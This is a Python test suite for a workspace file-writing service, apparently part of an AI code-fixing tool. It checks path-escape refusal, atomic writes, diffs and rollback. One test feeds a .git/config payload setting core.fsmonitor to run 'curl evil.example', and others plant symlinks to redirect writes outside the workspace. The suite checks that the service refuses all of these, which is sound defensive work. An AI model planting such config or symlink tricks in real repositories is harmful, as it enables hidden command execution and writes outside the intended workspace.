from tests import hermetic  # noqa: F401 — throwaway state dir; see tests/hermetic.py
import difflib
import os
import re
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from engine.fs import MAX_DIFF_BYTES, FileSystemService, GitMetadataError, PathEscapeError
from engine.library import text_lines
from typing import Any


def on_disk(root: Path, rel: str) -> str:
    """What is on disk, read around the service under test."""
    return (root / rel).read_text(encoding="utf-8")


class TestFileSystemService(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_resolve_valid(self) -> None:
        resolved = self.fs.resolve("src/main.py")
        self.assertEqual(resolved, self.root / "src/main.py")

    def test_resolve_escapes(self) -> None:
        with self.assertRaises(PathEscapeError):
            self.fs.resolve("../secret.txt")

        with self.assertRaises(PathEscapeError):
            self.fs.resolve("/etc/passwd")

        with self.assertRaises(PathEscapeError):
            self.fs.resolve("foo/../../bar")

        with self.assertRaises(PathEscapeError):
            self.fs.resolve("")

    def test_apply_create_update_delete(self) -> None:
        # Create. `list[dict]` on purpose: a delete carries `content: None`
        # while the other actions carry text, so the values are not uniformly str.
        files: list[dict[str, Any]] = [{"path": "new_file.txt", "action": "create", "content": "line 1\nline 2\n"}]
        summaries = self.fs.apply(files, dry_run=False)
        self.assertEqual(len(summaries), 1)
        self.assertTrue((self.root / "new_file.txt").exists())
        self.assertIn("+line 1", summaries[0]["unified_diff"])

        # Update
        files = [{"path": "new_file.txt", "action": "update", "content": "line 1\nline 2 modified\n"}]
        summaries = self.fs.apply(files, dry_run=False)
        self.assertEqual(on_disk(self.root, "new_file.txt"), "line 1\nline 2 modified\n")
        self.assertIn("-line 2", summaries[0]["unified_diff"])
        self.assertIn("+line 2 modified", summaries[0]["unified_diff"])

        # Delete
        files = [{"path": "new_file.txt", "action": "delete", "content": None}]
        summaries = self.fs.apply(files, dry_run=False)
        self.assertFalse((self.root / "new_file.txt").exists())
        self.assertIn("-line 1", summaries[0]["unified_diff"])

    def test_apply_dry_run(self) -> None:
        files = [{"path": "dry_file.txt", "action": "create", "content": "dry content\n"}]
        summaries = self.fs.apply(files, dry_run=True)
        self.assertEqual(len(summaries), 1)
        self.assertFalse((self.root / "dry_file.txt").exists())
        self.assertIn("+dry content", summaries[0]["unified_diff"])


class TestWhatApplyActuallyChanged(unittest.TestCase):
    """`changed` and `diff_note`: the fixer's proposal is not evidence of a change."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_a_proposal_matching_the_current_contents_is_not_a_change(self) -> None:
        (self.root / "same.py").write_text("value = 1\n", encoding="utf-8")
        before = (self.root / "same.py").stat().st_mtime_ns

        summaries = self.fs.apply(
            [{"path": "same.py", "action": "update", "content": "value = 1\n"}], dry_run=False
        )

        self.assertFalse(summaries[0]["changed"])
        self.assertEqual(summaries[0]["unified_diff"], "")
        self.assertEqual((self.root / "same.py").stat().st_mtime_ns, before, "not rewritten")

    def test_creating_a_file_that_already_has_that_content_is_not_a_change(self) -> None:
        (self.root / "there.py").write_text("x\n", encoding="utf-8")
        summaries = self.fs.apply(
            [{"path": "there.py", "action": "create", "content": "x\n"}], dry_run=False
        )
        self.assertFalse(summaries[0]["changed"])

    def test_deleting_a_missing_file_is_not_a_change(self) -> None:
        summaries = self.fs.apply(
            [{"path": "ghost.py", "action": "delete", "content": None}], dry_run=False
        )
        self.assertFalse(summaries[0]["changed"], "nothing disappeared, so nothing changed")

    def test_deleting_an_empty_file_is_a_change(self) -> None:
        (self.root / "empty.py").write_text("", encoding="utf-8")
        summaries = self.fs.apply(
            [{"path": "empty.py", "action": "delete", "content": None}], dry_run=False
        )
        self.assertTrue(summaries[0]["changed"], "the file is gone even with no content")
        self.assertFalse((self.root / "empty.py").exists())
        self.assertEqual(summaries[0]["unified_diff"], "", "an empty file has no diff to show")

    def test_a_binary_file_still_gets_written_and_says_why_there_is_no_diff(self) -> None:
        (self.root / "logo.bin").write_bytes(b"\x00\x01\x02old")
        summaries = self.fs.apply(
            [{"path": "logo.bin", "action": "update", "content": "\x00\x01\x02new"}],
            dry_run=False,
        )
        self.assertTrue(summaries[0]["changed"])
        self.assertEqual(summaries[0]["unified_diff"], "")
        self.assertEqual(summaries[0]["diff_note"], "file is binary")
        self.assertEqual((self.root / "logo.bin").read_bytes(), b"\x00\x01\x02new")

    def test_an_oversized_file_is_written_without_building_a_huge_diff(self) -> None:
        big = "x" * (MAX_DIFF_BYTES + 10)
        (self.root / "big.txt").write_text(big, encoding="utf-8")
        summaries = self.fs.apply(
            [{"path": "big.txt", "action": "update", "content": "small now\n"}], dry_run=False
        )
        self.assertEqual(summaries[0]["unified_diff"], "")
        self.assertIn("too large to diff", summaries[0]["diff_note"])
        self.assertEqual(on_disk(self.root, "big.txt"), "small now\n")

    def test_a_file_that_cannot_be_decoded_is_diffed_as_missing_text(self) -> None:
        (self.root / "latin.txt").write_bytes(b"caf\xe9 not utf-8")
        summaries = self.fs.apply(
            [{"path": "latin.txt", "action": "update", "content": "now utf-8\n"}], dry_run=False
        )
        self.assertIn(summaries[0]["diff_note"], ("file is not UTF-8 text", "file is binary"))
        self.assertEqual(on_disk(self.root, "latin.txt"), "now utf-8\n")

    def test_no_temporary_file_is_left_behind(self) -> None:
        self.fs.apply([{"path": "a.txt", "action": "create", "content": "a\n"}], dry_run=False)
        self.assertEqual(sorted(p.name for p in self.root.iterdir()), ["a.txt"])

    @unittest.skipUnless(os.name == "posix", "the executable bit is a POSIX idea")
    def test_an_edit_keeps_the_files_permissions(self) -> None:
        # The write is temp-file + rename, and the temp file is born with the
        # process default. Renaming it over an executable script dropped the
        # executable bit, so `run.sh` came back 644 and the commit the fixer
        # then made recorded a mode change nobody asked for.
        script = self.root / "run.sh"
        script.write_text("#!/bin/sh\necho old\n", encoding="utf-8")
        script.chmod(0o755)

        self.fs.apply([{"path": "run.sh", "action": "update", "content": "#!/bin/sh\necho new\n"}], dry_run=False)

        self.assertEqual(on_disk(self.root, "run.sh"), "#!/bin/sh\necho new\n")
        self.assertEqual(script.stat().st_mode & 0o777, 0o755)

    @unittest.skipUnless(os.name == "posix", "the executable bit is a POSIX idea")
    def test_a_new_file_is_not_made_executable_by_an_edit_of_another_file(self) -> None:
        # The other half of the same rule: there is no earlier mode to honour
        # for a file that did not exist, so a create keeps whatever the process
        # default is rather than inheriting anything.
        self.fs.apply([{"path": "fresh.sh", "action": "create", "content": "#!/bin/sh\n"}], dry_run=False)

        self.assertEqual((self.root / "fresh.sh").stat().st_mode & 0o111, 0)

    def test_read_text_or_none_is_none_exactly_when_there_is_no_text(self) -> None:
        (self.root / "ok.txt").write_text("text\n", encoding="utf-8")
        (self.root / "blob.bin").write_bytes(b"\x00\x01binary")
        (self.root / "dir").mkdir()

        self.assertEqual(self.fs.read_text_or_none("ok.txt"), "text\n")
        self.assertIsNone(self.fs.read_text_or_none("blob.bin"), "a NUL byte is not source code")
        self.assertIsNone(self.fs.read_text_or_none("dir"))
        self.assertIsNone(self.fs.read_text_or_none("missing.py"))
        self.assertIsNone(self.fs.read_text_or_none("../../etc/passwd"))
        self.assertIsNone(self.fs.read_text_or_none("/etc/passwd"))

    def test_a_symlink_out_of_the_workspace_is_still_refused(self) -> None:
        outside = Path(self.temp_dir.name).parent / "codify-fs-outside.txt"
        outside.write_text("secret\n", encoding="utf-8")
        try:
            (self.root / "link.txt").symlink_to(outside)
            with self.assertRaises(PathEscapeError):
                self.fs.resolve("link.txt")
        finally:
            outside.unlink(missing_ok=True)


class TestADiffCountsLinesAsReadFileDoes(unittest.TestCase):
    """A diff's hunks are numbered by `\\n` alone, the way `read_file` and the search tools count (`library.text_lines`).

    `str.splitlines` also cuts at a form feed, a vertical tab, U+001C-1E, NEL, U+2028 and U+2029. The diff did,
    so a file holding one got hunk headers that disagreed with every other tool's line numbers, and `difflib`
    (which joins its pieces with nothing between them) ran the two halves of a cut line into the next one.
    """

    SEPARATORS = ("\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029")

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def diff_of(self, before: str, after: str) -> str:
        (self.root / "f").write_bytes(before.encode("utf-8"))  # bytes: no newline translation
        [summary] = self.fs.apply([{"path": "f", "action": "update", "content": after}], dry_run=True)
        return str(summary["unified_diff"])

    def assert_hunks_agree_with_text_lines(self, diff: str, before: str) -> None:
        """Every hunk's header names the lines `text_lines` numbers that way, and its body holds exactly those."""
        old_lines = text_lines(before)
        hunks = re.split(r"^@@ -(\d+),(\d+) \+\d+,\d+ @@\n", diff, flags=re.MULTILINE)
        self.assertGreater(len(hunks), 1, "the diff has no hunk")
        for start, count, body in zip(hunks[1::3], hunks[2::3], hunks[3::3], strict=True):
            rows = body.split("\n")[:-1]
            self.assertTrue(all(r[:1] in (" ", "+", "-") for r in rows), f"a line lost its marker: {rows!r}")
            old_side = "\n".join(r[1:] for r in rows if r[0] != "+")
            first = int(start) - 1
            self.assertEqual(old_lines[first : first + int(count)], text_lines(old_side + "\n"))

    def test_hunk_headers_and_bodies_follow_text_lines(self) -> None:
        for sep in self.SEPARATORS:
            with self.subTest(sep=repr(sep)):
                before = f"head\nline1{sep}line2\nline3\nline4\nline5\nline6\nline7\nline8\ntail\n"
                diff = self.diff_of(before, before.replace("line4", "line4 changed"))
                # line4 is line 4 by read_file's count: three lines of context before it, so the hunk starts at 1.
                self.assertIn("@@ -1,7 +1,7 @@\n", diff)
                self.assertIn(f" line1{sep}line2\n", diff, "a context line was cut at the separator")
                self.assert_hunks_agree_with_text_lines(diff, before)

    def test_a_change_inside_a_line_with_a_separator_is_one_removed_and_one_added_line(self) -> None:
        for sep in self.SEPARATORS:
            with self.subTest(sep=repr(sep)):
                diff = self.diff_of(f"h\n1{sep}2\n3\n", f"h\n1{sep}Z\n3\n")
                self.assertEqual(f"--- a/f\n+++ b/f\n@@ -1,3 +1,3 @@\n h\n-1{sep}2\n+1{sep}Z\n 3\n", diff)

    def test_a_lone_cr_stays_inside_its_line(self) -> None:
        # `text_lines` counts `\n` only, so `a\rb` is one line; `splitlines` cut it in two and numbered the hunk 1,4.
        diff = self.diff_of("h\na\rb\nc\n", "h\na\rB\nc\n")
        self.assertEqual("--- a/f\n+++ b/f\n@@ -1,3 +1,3 @@\n h\n-a\rb\n+a\rB\n c\n", diff)
        before = "head\nline1\rline2\nline3\nline4\nline5\nline6\nline7\nline8\ntail\n"
        diff = self.diff_of(before, before.replace("line4", "line4 changed"))
        self.assertIn("@@ -1,7 +1,7 @@\n", diff)
        self.assertIn(" line1\rline2\n", diff)
        self.assert_hunks_agree_with_text_lines(diff, before)

    def test_an_ordinary_diff_is_what_it_always_was(self) -> None:
        # The pinned strings are what `splitlines(keepends=True)` rendered before the change.
        self.assertEqual("--- a/f\n+++ b/f\n@@ -1,2 +1,2 @@\n a\r\n-b\r\n+c\r\n", self.diff_of("a\r\nb\r\n", "a\r\nc\r\n"))
        self.assertEqual("--- a/f\n+++ b/f\n@@ -1,2 +1,2 @@\n a\n-b\n+c\n", self.diff_of("a\nb\n", "a\nc\n"))
        self.assertEqual("--- a/f\n+++ b/f\n@@ -0,0 +1,2 @@\n+a\n+b\n", self.diff_of("", "a\nb\n"))

    def test_the_rendered_diff_matches_splitlines_wherever_the_two_cut_alike(self) -> None:
        # A small deterministic corpus: LF, CRLF, no final newline, empty, blank lines, non-ASCII.
        texts = ["", "\n", "a", "a\n", "a\nb", "a\r\nb\r\n", "a\r\nb", "\n\n", "é\n\U0001f600\nx", "a\n\nb\n\n"]

        def splitlines(text: str) -> list[str]:
            return text.splitlines(keepends=True)

        for before in texts:
            for after in texts:
                if before == after:
                    continue
                with self.subTest(before=before, after=after):
                    expected = "".join(difflib.unified_diff(splitlines(before), splitlines(after), "a/f", "b/f"))
                    self.assertEqual(expected, self.diff_of(before, after))


class TestALoneSurrogateIsRefusedBeforeAnythingIsDone(unittest.TestCase):
    """Text that cannot be saved as UTF-8 is refused in phase one, so a dry run and a real run agree.

    A reply's JSON can spell `"\\ud800"`. The real run only noticed when it made the bytes, in phase two, and rolled
    back; a dry run never gets that far, accepted it, and left the failure to the database. The refusal is a
    `ValueError` (the fixer is asked about it once) that names the file and says what to do.
    """

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        (self.root / "a.py").write_text("x = 1\n", encoding="utf-8")
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def tree(self) -> dict[str, bytes | None]:
        return {
            str(p.relative_to(self.root)): (p.read_bytes() if p.is_file() else None)
            for p in sorted(self.root.rglob("*"))
        }

    def refused(self, files: list[dict[str, Any]], *, dry_run: bool) -> str:
        before = self.tree()
        with self.assertRaises(ValueError) as caught:
            self.fs.apply(files, dry_run=dry_run)
        self.assertEqual(before, self.tree(), "a refused batch changed the tree")
        return str(caught.exception)

    def test_a_dry_run_and_a_real_run_refuse_the_same_text_with_the_same_words(self) -> None:
        files: list[dict[str, Any]] = [
            {"path": "new/sub/b.py", "action": "create", "content": "ok\n"},
            {"path": "a.py", "action": "update", "content": "x\ud800y"},
        ]
        real = self.refused(files, dry_run=False)
        dry = self.refused(files, dry_run=True)
        self.assertEqual(real, dry)
        self.assertIn("'a.py'", real)
        self.assertIn("\\ud800", real, "the escape was not shown the way the model wrote it")
        self.assertIn("lone surrogate", real)
        self.assertNotIn("codec", real)
        self.assertTrue(real.isascii(), "the reason carries the surrogate itself, which would break the re-ask prompt")

    def test_an_edits_new_text_is_judged_as_the_text_it_makes(self) -> None:
        edit = {"old_text": "x = 1", "new_text": "x = '\udfff'"}
        for dry_run in (True, False):
            with self.subTest(dry_run=dry_run):
                message = self.refused([{"path": "a.py", "action": "edit", "edits": [edit]}], dry_run=dry_run)
                self.assertIn("'a.py'", message)

    def test_a_path_that_would_make_a_non_utf8_filename_is_refused(self) -> None:
        for path in ("b\udc80.py", "b\ud800.py", "dir\udcff/b.py"):
            for dry_run in (True, False):
                with self.subTest(path=path, dry_run=dry_run):
                    message = self.refused([{"path": path, "action": "create", "content": "x\n"}], dry_run=dry_run)
                    self.assertIn("path", message)
                    self.assertTrue(message.isascii())

    def test_a_delete_has_no_text_to_judge(self) -> None:
        # A delete's `content` is ignored by `apply`, so what it holds cannot make the delete refused.
        for content in (None, "x\ud800"):
            with self.subTest(content=content):
                (self.root / "a.py").write_text("x = 1\n", encoding="utf-8")
                [summary] = self.fs.apply([{"path": "a.py", "action": "delete", "content": content}], dry_run=False)
                self.assertTrue(summary["changed"])
                self.assertFalse((self.root / "a.py").exists())

    def test_a_delete_of_a_path_that_is_not_a_filename_is_refused_like_any_other_action(self) -> None:
        for dry_run in (True, False):
            with self.subTest(dry_run=dry_run):
                message = self.refused([{"path": "b\udc80.py", "action": "delete"}], dry_run=dry_run)
                self.assertIn("path", message)

    def test_a_valid_pair_is_one_character_and_is_written(self) -> None:
        # json.loads combines "\\ud83d\\ude00" into one character before the engine sees it.
        import json

        text = json.loads('"smile \\ud83d\\ude00\\n"')
        self.fs.apply([{"path": "smile.txt", "action": "create", "content": text}], dry_run=False)
        self.assertEqual("smile \U0001f600\n", on_disk(self.root, "smile.txt"))


class TestAFailedWriteLeavesNoDirectoryBehind(unittest.TestCase):
    """`apply` promises all of a batch or none of it, and a directory it made for a file is part of "all".

    A name of 240 characters is a legal target and an illegal temp file (`<name>.<12 hex>.codify-tmp` is over the
    255 a name may be), so a dry run accepts it and the real write fails at the open. The directories had been made
    by then, outside the `try` that takes them back, and stayed.
    """

    LONG = "n" * 240 + ".py"

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        (self.root / "keep.py").write_text("x = 1\n", encoding="utf-8")
        (self.root / "shared").mkdir()
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def tree(self) -> dict[str, bytes | None]:
        return {
            str(p.relative_to(self.root)): (p.read_bytes() if p.is_file() else None)
            for p in sorted(self.root.rglob("*"))
        }

    def fails_and_changes_nothing(self, files: list[dict[str, Any]]) -> None:
        before = self.tree()
        self.fs.apply(files, dry_run=True)  # the dry run is phase one only: it accepts every one of these
        with self.assertRaises(OSError):
            self.fs.apply(files, dry_run=False)
        self.assertEqual(before, self.tree(), "a failed batch left something behind")

    def test_the_directories_made_for_a_file_whose_temp_file_cannot_be_opened_are_removed(self) -> None:
        self.fails_and_changes_nothing([{"path": f"newdir/sub/{self.LONG}", "action": "create", "content": "hi\n"}])

    def test_the_same_when_a_later_file_in_the_batch_is_the_one_that_fails(self) -> None:
        self.fails_and_changes_nothing(
            [
                {"path": "keep.py", "action": "update", "content": "x = 2\n"},
                {"path": "first/deep/ok.py", "action": "create", "content": "ok\n"},
                {"path": "shared/ok.py", "action": "create", "content": "ok\n"},
                {"path": f"second/sub/{self.LONG}", "action": "create", "content": "hi\n"},
            ]
        )

    def test_a_directory_both_files_would_have_made_goes_when_the_second_file_fails(self) -> None:
        self.fails_and_changes_nothing(
            [
                {"path": "common/ok.py", "action": "create", "content": "ok\n"},
                {"path": f"common/inner/{self.LONG}", "action": "create", "content": "hi\n"},
            ]
        )

    def test_a_directory_the_filesystem_refuses_half_way_down_takes_its_parents_with_it(self) -> None:
        before = self.tree()
        with self.assertRaises(OSError):
            self.fs.apply([{"path": f"a/b/{'d' * 300}/c.py", "action": "create", "content": "x\n"}], dry_run=False)
        self.assertEqual(before, self.tree())

    def test_a_full_disk_at_the_open_is_no_different(self) -> None:
        import errno

        before = self.tree()
        with mock.patch("engine.fs.os.open", side_effect=OSError(errno.ENOSPC, "No space left on device")):
            with self.assertRaises(OSError):
                self.fs.apply([{"path": "new/dir/f.py", "action": "create", "content": "x\n"}], dry_run=False)
        self.assertEqual(before, self.tree())

    def test_a_file_that_is_not_ours_in_a_directory_we_made_is_never_removed(self) -> None:
        # The rollback takes back empty directories with `rmdir`; it must not make one empty to do it.
        real = FileSystemService._write_atomic
        calls: list[int] = []

        def second_write_fails(fs: FileSystemService, target: Path, data: bytes) -> list[Path]:
            calls.append(1)
            if len(calls) == 2:
                (self.root / "new" / "foreign.txt").write_text("not ours\n", encoding="utf-8")
                raise OSError(28, "No space left on device")
            return real(fs, target, data)

        files: list[dict[str, Any]] = [
            {"path": "new/a.py", "action": "create", "content": "a\n"},
            {"path": "other.py", "action": "create", "content": "b\n"},
        ]
        with mock.patch.object(FileSystemService, "_write_atomic", second_write_fails):
            with self.assertRaises(OSError):
                self.fs.apply(files, dry_run=False)
        self.assertEqual("not ours\n", on_disk(self.root, "new/foreign.txt"))
        self.assertFalse((self.root / "new" / "a.py").exists(), "the batch's own file was left")
        self.assertFalse((self.root / "other.py").exists())

    def test_the_same_when_the_write_itself_fails_after_the_temp_file_is_open(self) -> None:
        def replace_fails(src: Any, dst: Any) -> None:
            (self.root / "new" / "sub" / "foreign.txt").write_text("not ours\n", encoding="utf-8")
            raise OSError(5, "Input/output error")

        with mock.patch("engine.fs.os.replace", side_effect=replace_fails):
            with self.assertRaises(OSError):
                self.fs.apply([{"path": "new/sub/f.py", "action": "create", "content": "x\n"}], dry_run=False)
        self.assertEqual("not ours\n", on_disk(self.root, "new/sub/foreign.txt"))
        self.assertEqual([], [p.name for p in (self.root / "new" / "sub").iterdir() if p.name != "foreign.txt"],
                         "this call's temp file or target was left behind")

    def test_a_write_that_succeeds_still_keeps_the_directories_it_made(self) -> None:
        self.fs.apply([{"path": "new/dir/f.py", "action": "create", "content": "x\n"}], dry_run=False)
        self.assertEqual("x\n", on_disk(self.root, "new/dir/f.py"))


class TestEditAction(unittest.TestCase):
    """The fixer's search/replace op: resolved against the file as it exists."""

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def _seed(self, text: str, name: str = "svc.py") -> None:
        (self.root / name).write_text(text, encoding="utf-8")

    def test_an_exact_match_edit_replaces_and_reports_resolved_content(self) -> None:
        self._seed("def greet():\n    return 1\n")
        summaries = self.fs.apply(
            [{"path": "svc.py", "action": "edit",
              "edits": [{"old_text": "return 1", "new_text": "return 42"}]}],
            dry_run=False,
        )
        self.assertEqual(on_disk(self.root, "svc.py"), "def greet():\n    return 42\n")
        self.assertTrue(summaries[0]["changed"])
        self.assertIn("-    return 1", summaries[0]["unified_diff"])
        self.assertIn("+    return 42", summaries[0]["unified_diff"])
        # The resolved full content is what a dry-run proposal would store.
        self.assertEqual(summaries[0]["resolved_content"], "def greet():\n    return 42\n")

    def test_a_dry_run_edit_resolves_without_writing(self) -> None:
        self._seed("a = 1\n")
        summaries = self.fs.apply(
            [{"path": "svc.py", "action": "edit",
              "edits": [{"old_text": "a = 1", "new_text": "a = 2"}]}],
            dry_run=True,
        )
        # Nothing written, but the proposal is concrete content, ready to store.
        self.assertEqual(on_disk(self.root, "svc.py"), "a = 1\n")
        self.assertTrue(summaries[0]["changed"])
        self.assertEqual(summaries[0]["resolved_content"], "a = 2\n")

    def test_a_no_op_edit_is_not_a_change(self) -> None:
        self._seed("a = 1\n")
        summaries = self.fs.apply(
            [{"path": "svc.py", "action": "edit",
              "edits": [{"old_text": "a = 1", "new_text": "a = 1"}]}],
            dry_run=False,
        )
        self.assertFalse(summaries[0]["changed"])

    def test_a_count_mismatch_is_refused(self) -> None:
        self._seed("x = f()\ny = f()\n")
        with self.assertRaises(ValueError) as ctx:
            self.fs.apply(
                [{"path": "svc.py", "action": "edit",
                  "edits": [{"old_text": "f()", "new_text": "g()"}]}],
                dry_run=False,
            )
        self.assertIn("appears 2 time(s), expected 1", str(ctx.exception))
        # The file is untouched — a refused edit must not write half an edit.
        self.assertEqual(on_disk(self.root, "svc.py"), "x = f()\ny = f()\n")

    def test_count_zero_replaces_every_occurrence(self) -> None:
        self._seed("x = f()\ny = f()\n")
        self.fs.apply(
            [{"path": "svc.py", "action": "edit",
              "edits": [{"old_text": "f()", "new_text": "g()", "count": 0}]}],
            dry_run=False,
        )
        self.assertEqual(on_disk(self.root, "svc.py"), "x = g()\ny = g()\n")

    def test_an_absent_old_text_is_refused(self) -> None:
        self._seed("a = 1\n")
        with self.assertRaises(ValueError) as ctx:
            self.fs.apply(
                [{"path": "svc.py", "action": "edit",
                  "edits": [{"old_text": "not there", "new_text": "x"}]}],
                dry_run=False,
            )
        self.assertIn("old_text appears 0 time(s), expected 1", str(ctx.exception))

    def test_an_empty_old_text_is_refused(self) -> None:
        """old_text="" would make str.replace interleave `new` between every
        character, and the occurrence math is meaningless for it — the empty
        match must be named as a bad edit, not reported as "not found"."""
        self._seed("a = 1\n")
        with self.assertRaises(ValueError) as ctx:
            self.fs.apply(
                [{"path": "svc.py", "action": "edit",
                  "edits": [{"old_text": "", "new_text": "x"}]}],
                dry_run=False,
            )
        self.assertIn("old_text must not be empty", str(ctx.exception))
        self.assertEqual(on_disk(self.root, "svc.py"), "a = 1\n")

    def test_edits_apply_in_order_against_the_previous_result(self) -> None:
        self._seed("def greet():\n    return 1\n")
        self.fs.apply(
            [{"path": "svc.py", "action": "edit", "edits": [
                {"old_text": "return 1", "new_text": "return 2"},
                {"old_text": "return 2", "new_text": "return 3"},
            ]}],
            dry_run=False,
        )
        self.assertEqual(on_disk(self.root, "svc.py"), "def greet():\n    return 3\n")

    def test_an_edit_on_a_missing_file_is_refused(self) -> None:
        with self.assertRaises(ValueError):
            self.fs.apply(
                [{"path": "ghost.py", "action": "edit",
                  "edits": [{"old_text": "x", "new_text": "y"}]}],
                dry_run=False,
            )


class TestTheRepositorysOwnMetadataIsNotAFilesPath(unittest.TestCase):
    """`.git/` is inside the workspace and outside what a file write may touch.

    Two failures, one shape: `.git/config` can carry a credential in a remote
    URL, and setting `core.fsmonitor` there names a command git runs on every
    later `status` — the librarian's and the user's, long after the goal that
    wrote it. A submodule or a linked worktree keeps a second `.git` a level
    down, and a symlink reaches one without spelling it, so all three are here.
    """

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.root = Path(self.temp_dir.name).resolve()
        self.fs = FileSystemService(str(self.root))
        (self.root / ".git").mkdir()
        (self.root / ".git" / "config").write_text("[core]\n", encoding="utf-8")

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_a_write_into_git_is_refused_and_leaves_the_file_alone(self) -> None:
        with self.assertRaises(GitMetadataError):
            self.fs.apply(
                [{"path": ".git/config", "action": "update",
                  "content": "[core]\n\tfsmonitor = curl evil.example\n"}],
                dry_run=False,
            )
        self.assertEqual((self.root / ".git" / "config").read_text(encoding="utf-8"), "[core]\n")

    def test_a_hook_cannot_be_written_either(self) -> None:
        with self.assertRaises(GitMetadataError):
            self.fs.apply(
                [{"path": ".git/hooks/pre-commit", "action": "create", "content": "#!/bin/sh\n"}],
                dry_run=False,
            )
        self.assertFalse((self.root / ".git" / "hooks" / "pre-commit").exists())

    def test_a_read_returns_nothing_rather_than_the_config(self) -> None:
        # Both read doors already treat a path that escapes the workspace this
        # way — `read_text_or_none` answers "nothing to read here" and the
        # stricter `read_editable` raises — so git's metadata behaves like `../x`
        # rather than getting a third, softer answer of its own.
        self.assertIsNone(self.fs.read_text_or_none(".git/config"))
        with self.assertRaises(PathEscapeError):
            self.fs.read_editable(".git/config")

    def test_the_same_refusal_two_levels_down_and_through_a_symlink(self) -> None:
        # A submodule's own metadata, and a link that reaches the root's without
        # naming it. `resolve` asks where a path lands, so both are the same
        # answer as the literal spelling above.
        nested = self.root / "vendor" / "sub" / ".git"
        nested.mkdir(parents=True)
        (nested / "config").write_text("[core]\n", encoding="utf-8")
        with self.assertRaises(GitMetadataError):
            self.fs.resolve("vendor/sub/.git/config")

        (self.root / "shortcut").symlink_to(self.root / ".git", target_is_directory=True)
        with self.assertRaises(GitMetadataError):
            self.fs.resolve("shortcut/config")

    def test_a_file_merely_named_like_it_is_still_ordinary(self) -> None:
        # The rule is about the directory, not the string: `.gitignore` and
        # `.github/` are workspace files the fixer has every reason to edit.
        (self.root / ".gitignore").write_text("build/\n", encoding="utf-8")
        self.assertEqual(self.fs.resolve(".gitignore"), self.root / ".gitignore")
        (self.root / ".github" / "workflows").mkdir(parents=True)
        self.assertTrue(self.fs.resolve(".github/workflows/ci.yml"))


class TestAWriteCannotBeRedirectedThroughItsTempFile(unittest.TestCase):
    """The atomic write must not follow a symlink a repository planted for it.

    The temp file used to be `<file>.codify-tmp`, a name anyone could predict and a
    repository could ship as a symlink. `write_text` follows symlinks, so writing
    `a.txt` overwrote whatever that link pointed at — outside the workspace
    included, which is the one thing every other check in this module exists to
    prevent.
    """

    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        base = Path(self.temp_dir.name).resolve()
        self.root = base / "workspace"
        self.root.mkdir()
        self.outside = base / "outside"
        self.outside.mkdir()
        self.victim = self.outside / "victim.txt"
        self.victim.write_text("ORIGINAL\n", encoding="utf-8")
        self.fs = FileSystemService(str(self.root))

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def test_a_planted_temp_symlink_does_not_redirect_the_write(self) -> None:
        (self.root / "a.txt.codify-tmp").symlink_to(self.victim)
        self.fs.apply([{"path": "a.txt", "action": "create", "content": "engine\n"}], dry_run=False)
        self.assertEqual("engine\n", (self.root / "a.txt").read_text(encoding="utf-8"))
        self.assertEqual("ORIGINAL\n", self.victim.read_text(encoding="utf-8"), "the write escaped the workspace")

    def test_a_dangling_planted_symlink_does_not_create_a_file_outside(self) -> None:
        target = self.outside / "created-by-the-link"
        (self.root / "b.txt.codify-tmp").symlink_to(target)
        self.fs.apply([{"path": "b.txt", "action": "create", "content": "engine\n"}], dry_run=False)
        self.assertFalse(target.exists(), "a file appeared outside the workspace")

    def test_no_temp_file_is_left_behind(self) -> None:
        self.fs.apply([{"path": "c.txt", "action": "create", "content": "x\n"}], dry_run=False)
        self.assertEqual(["c.txt"], sorted(p.name for p in self.root.iterdir()))

    def test_an_executable_keeps_its_mode_across_a_rewrite(self) -> None:
        self.fs.apply([{"path": "d.sh", "action": "create", "content": "#!/bin/sh\n"}], dry_run=False)
        os.chmod(self.root / "d.sh", 0o700)
        self.fs.apply([{"path": "d.sh", "action": "create", "content": "#!/bin/sh\necho hi\n"}], dry_run=False)
        self.assertEqual(0o700, (self.root / "d.sh").stat().st_mode & 0o777)


if __name__ == "__main__":
    unittest.main()
